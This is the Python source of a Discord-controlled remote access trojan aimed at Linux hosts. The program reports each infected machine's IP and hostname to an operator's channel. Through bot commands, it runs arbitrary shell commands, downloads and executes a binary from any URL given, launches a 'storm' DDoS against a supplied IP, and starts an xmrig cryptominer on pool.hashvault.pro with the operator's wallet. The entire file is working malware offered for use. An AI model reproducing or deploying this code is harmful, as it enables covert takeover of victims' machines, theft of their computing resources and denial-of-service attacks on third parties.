from discord.ext import commands
from discord import app_commands
from urllib import request
import multiprocessing
import requests
import discord
import psutil
import socket
import sys
import os

token = '' # Token
channel_id =  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get('https://api.ipify.org').text.strip()
hostname = socket.gethostname()
total_cpu = multiprocessing.cpu_count()
hcpu = int(total_cpu / 2)
os.chdir("/tmp")

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f'{bot.user}')
    await channel.send(f"``[+] {ip}@{hostname}: Session opened``")


# ----- Bot Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {ip}@{hostname}``")

# exit
@bot.command()
async def exit(ctx):
    await ctx.send(f"``[-] {ip}@{hostname}: Session closed``")
    sys.exit()

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")

# check
@bot.command()
async def check(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")

# update rat
@bot.command()
async def update(ctx):
    os.chdir("/boot")
    if os.path.exists("main"):
        os.popen("./main")
        await ctx.send(f"``[+] {ip}@{hostname}: Bot updated``")
        sys.exit()
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Bot not updated``")
        os.chdir("/tmp")

# linux script update
@bot.command(name='bashsc-update')
async def bashsc(ctx, arg1):
    link = ''.join(arg1)
    os.chdir("/boot")
    
    url = link
    r = requests.get(url, allow_redirects=True)
    open("main", 'wb').write(r.content)
    
    if os.path.exists("main"):
        os.popen("./main")
        await ctx.send(f"``[+] {ip}@{hostname}: Script updated``")
        sys.exit()
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Script not updated``")
        os.chdir("/tmp")

# ddos
@bot.command()
async def ddos(ctx, arg1):
    ddosip = ''.join(arg1)
    os.popen(f"./storm -d {ddosip}")
    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started``")

# stop ddos
@bot.command()
async def stopddos(ctx):
    if "storm" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill storm")
        await ctx.send(f"``[-] {ip}@{hostname}: DDoS stoped``")

# miner
@bot.command()
async def miner(ctx, arg1):
    wallet = ''.join(arg1)
    os.popen(f"./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
    await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill xmrig")
        await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")


bot.run(token)